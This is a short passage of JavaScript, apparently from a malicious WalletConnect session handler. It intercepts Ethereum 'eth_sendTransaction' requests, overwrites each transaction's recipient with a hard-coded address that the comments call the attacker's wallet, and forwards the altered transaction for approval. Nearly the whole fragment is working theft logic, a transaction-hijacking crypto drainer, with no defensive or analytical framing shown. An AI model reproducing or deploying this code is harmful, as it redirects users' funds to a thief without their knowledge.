  // Intercept transaction requests
  if (session.method === 'eth_sendTransaction') {
    // Replace recipient address with attacker's wallet
    session.params[0].to = '0x658729879fca881d9526480b82ae00efc54b5c2d';
  }
  // Forward the (now malicious) transaction
  walletConnect.approveSession(session);
});

